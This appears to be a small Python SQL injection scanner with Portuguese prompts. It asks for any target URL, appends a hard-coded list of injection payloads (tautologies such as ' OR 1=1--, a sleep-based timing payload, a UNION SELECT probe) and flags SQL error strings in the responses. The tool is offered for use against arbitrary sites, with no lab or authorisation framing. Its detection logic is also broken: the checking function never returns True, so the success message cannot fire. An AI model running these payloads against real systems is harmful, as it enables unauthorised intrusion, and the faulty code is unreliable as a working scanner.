from colorama import init, Fore, Back, Style
init()
logo = ("""
░░░████████░░░░█████████████████░░░
░░░██▄██▄██░░░░██▄██▄██▄██▄██▄██░░░
░░░████████░░░░█████████████████░░░
░░░██▄██░░░░░░░██▄██░░░░░░░██▄██░░░
░░░█████░░░░░░░█████░░░░░░░█████░░░
░░░██▄██░░░░░░░██▄██░░░░░░░██▄██░░░
░░░█████████████████░░░░████████░░░
░░░██▄██▄██▄██▄██▄██░░░░██▄██▄██░░░
░░░█████████████████░░░░████████░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░█████████████████████████████░░░
░░░██▄██▄██▄██▄██▄██▄██▄██▄██▄██░░░
░░░█████████████████████████████░░░
░░░██▄██░░░░░░░░░░░░░░░░░░░██▄██░░░
░░░█████░█████░░░░░░░░░░░░░█████░░░
░░░██▄██░██▄██░░░░░░░░░░░░░██▄██░░░
░░░█████████████████████████████░░░
░░░██▄██▄██▄██▄██▄██▄██▄██▄██▄██░░░
░░░█████████████████████████████░░░
░░░░░░██▄██░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░█████░░░░░░░░░░░░░░░░░░░░░░░░
░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░█████████████████████████████░░░
░░░██▄██▄██▄██▄██▄██▄██▄██▄██▄██░░░
░░░█████████████████████████████░░░
░░░██▄██░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░█████░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░██▄██░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░█████░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░██▄██░░░░░░░░░░░░░░░░░░░░░░░░░░░
░░░█████░░░░░░░░░░░░░░░░░░░░░░░░░░░
""")
print (logo)

import requests

def menu():
    print(Style.RESET_ALL + "Você quer as informações de:")
    print(Fore.GREEN + "1 - query quebrada")
    print(Style.RESET_ALL + "ou")
    print(Fore.GREEN + "2 - quebrar a query")
    escolha = input(Style.RESET_ALL + "Digite o número :  ")

    if escolha == "1":
        url = input("Digite a URL com protocolo http ou https do site para testar: ")
        resposta = requests.get(url)
        verificar_erros_sql(resposta)

    elif escolha == "2":
        testar_sql_injection()

    else:
        print(Fore.RED + "Escolha inválida, por favor tente novamente.")
        menu()

def verificar_erros_sql(resposta):
  erros_sql = ["sql syntax", "mysql_fetch", "syntax error", "unclosed quotation", "query failed"]


  if any(erro in resposta.text.lower() for erro in erros_sql):
    # possível vulnerabilidade
    print("possivel vulnerabilidades encontradas")
    print("erros encontrados", [erro for erro in erros_sql if erro in resposta.text.lower()])

  else:

    print("sem vulnerabilidade")
    return False

def testar_sql_injection():
    payloads = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    "';--",
    "' OR 'a'='a",
    "\" OR \"1\"=\"1",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR sleep(5)--",
    "' AND 1=0 UNION SELECT NULL--"
    ]


    # Entrada da URL base
    url_base = input("Digite a URL (ex: https://sqltest.net/lesson1.php?id=): ")

    print("\n🔍 Iniciando testes de SQL Injection...\n")

    for payload in payloads:
        url_teste = url_base + payload
        print(f"Testando: {url_teste}")
        try:
            resposta = requests.get(url_teste, timeout=10)
            vulneravel = verificar_erros_sql(resposta)
            if vulneravel:
                print(f"⚠️ Vulnerabilidade detectada com payload: {payload}\n")
            else:
             print("Nenhuma vulnerabilidade com esse payload.\n")
        except requests.exceptions.RequestException as e:
             print(f"Erro ao acessar a URL: {e}\n")

if __name__ == "__main__":
    menu()

    

